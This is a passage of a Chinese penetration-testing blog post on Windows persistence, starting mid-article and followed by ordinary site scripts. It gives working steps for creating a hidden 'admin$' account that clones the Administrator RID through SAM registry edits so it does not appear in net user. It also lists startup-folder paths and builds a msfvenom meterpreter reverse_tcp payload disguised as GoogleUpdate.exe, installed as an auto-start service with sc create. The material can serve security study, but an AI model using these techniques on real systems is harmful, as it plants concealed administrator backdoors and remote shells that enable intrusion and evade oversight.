+<p>被分配用户的操作会以被劫持用户的身份留存事件日志  </p>
+</blockquote>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">对于Windows系统来说，注册表 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下包含当前系统的所有账户列表，每个账户的默认键值对应账户详细信息的注册表位置（即RID的十六进制表示）<br>创建克隆 administrator 的账号，且通过命令 net user 以及控制面板中的管理账户无法看到<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>用’$’创建匿名用户，并归到 administrators 用户组</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">net <span class="hljs-keyword">user</span> <span class="hljs-keyword">admin</span>$ <span class="hljs-keyword">admin</span>@<span class="hljs-number">123</span> /<span class="hljs-keyword">add</span> /y<br>net localgroup administrators <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br>net localgroup &quot;remote desktop users&quot; <span class="hljs-keyword">admin</span>$ /<span class="hljs-keyword">add</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216145101156.png" srcset="/img/loading.gif" lazyload alt="image-20240216145101156"></p>
+<p>这个时候通过控制面板还是可以看到</p>
+</li>
+<li><p>将 administrator 用户对应的 Users 中的 F 值复制替换后门账户的 F值</p>
+</li>
+</ol>
+<p>   导出匿名用户对应的sam目录下的注册表键值：  </p>
+<p>   regedt32.exe 打开 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users 键值，导出 Names  下用户目录以及对应的16进制目录。  </p>
+<p>   注意：SAM 下的注册表选项需要获得 system 权限才能读取，因此需要给 Administrator 用户赋予  SAM 键值权限，默认是不允的。  </p>
+<p>   或者直接修改 admin$ 用户的 F 值，把其中的 F2 03 修改为 F4 01 即可</p>
+<ol>
+<li><p>首先找到这个sam 然后修改权限，不然是看不到数据的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216151845729.png" srcset="/img/loading.gif" lazyload alt="image-20240216151845729"></p>
+<p>administrarot 是完全可以控制</p>
+</li>
+<li><p>导出管理员账户的对应的值</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152325067.png" srcset="/img/loading.gif" lazyload alt="image-20240216152325067"></p>
+<p>查看这个值为1f4 对应就是500</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152409726.png" srcset="/img/loading.gif" lazyload alt="image-20240216152409726"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152502912.png" srcset="/img/loading.gif" lazyload alt="image-20240216152502912"></p>
+</li>
+<li><p>找到我们创建的用户</p>
+<p>然后导出该用户的对应值</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152541251.png" srcset="/img/loading.gif" lazyload alt="image-20240216152541251"></p>
+<p>然后将该用户导出来</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216152711441.png" srcset="/img/loading.gif" lazyload alt="image-20240216152711441"></p>
+<p>双击就能导入</p>
+</li>
+<li><p>修改我们创建用户的F值</p>
+<p>有两种方式</p>
+<ul>
+<li><p>直接修改</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153054698.png" srcset="/img/loading.gif" lazyload alt="image-20240216153054698"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153010574.png" srcset="/img/loading.gif" lazyload alt="image-20240216153010574"></p>
+<p>注意这个值是反的</p>
+<p>我们修改为管理员的f 值</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153200582.png" srcset="/img/loading.gif" lazyload alt="image-20240216153200582"></p>
+</li>
+<li><p>修改导出的文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153313303.png" srcset="/img/loading.gif" lazyload alt="image-20240216153313303"></p>
+<p>将这个值直接粘贴成管理员用户的值</p>
+<p>然后删除我们创建的用户</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">admin</span>$ /del<br></code></pre></td></tr></table></figure>
+
+<p>删除之后导入admin$ 一套的reg文件</p>
+<p>可以使用双击或者一下的命令</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">1</span>.reg<br><span class="hljs-attribute">regedit</span> /s <span class="hljs-number">2</span>.reg<br></code></pre></td></tr></table></figure>
+
+<p>用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里  面有用户记录，其他地方都不存在用户的信息。net user 或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。</p>
+</li>
+</ul>
+</li>
+<li><p>检查是否存在</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153934969.png" srcset="/img/loading.gif" lazyload alt="image-20240216153934969"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216153955507.png" srcset="/img/loading.gif" lazyload alt="image-20240216153955507"></p>
+<p>成功隐藏</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/image-20240216154822379.png" srcset="/img/loading.gif" lazyload alt="image-20240216154822379"></p>
+<p>使用该用户登录，发现桌面和Administrator 的一样</p>
+<p>警告是因为由于两个同时登录</p>
+</li>
+</ol>
+<h1 id="文件夹启动"><a href="#文件夹启动" class="headerlink" title="文件夹启动"></a>文件夹启动</h1><p>这个现在很少用到了</p>
+<blockquote>
+<p>  在每次开机或重启的时候就会运行启动文件夹下的程序  </p>
+</blockquote>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\&#123;UserName&#125;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<br><br><span class="hljs-name">C</span>:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<br></code></pre></td></tr></table></figure>
+
+<h1 id="通过服务的方式自启动"><a href="#通过服务的方式自启动" class="headerlink" title="通过服务的方式自启动"></a>通过服务的方式自启动</h1><ol>
+<li><p>生成一个可以与服务管理器交互的（防止下线）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.58.144 <span class="hljs-attribute">lport</span>=8989 -f exe-service -o GoogleUpdate.exe<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>sc创建一个GoogleUpdateService服务，执行我们上传的木马</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">sc create GoogleUpdateService binPath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\Windows\temp\GoogleUpdate.exe&quot;</span> displayname<span class="hljs-operator">=</span><span class="hljs-string">&quot;GoogleUpdateService&quot;</span> start<span class="hljs-operator">=</span> auto<br><br></code></pre></td></tr></table></figure>
+
+<p>  重启权限维持。</p>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>windwos权限维持</div>
+      <div>https://tsy244.github.io/2024/02/16/渗透/windwos权限维持/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 16, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/16/%E6%B8%97%E9%80%8F/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="linux权限维持">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">linux权限维持</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/15/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" title="条件竞争">
+                        <span class="hidden-mobile">条件竞争</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
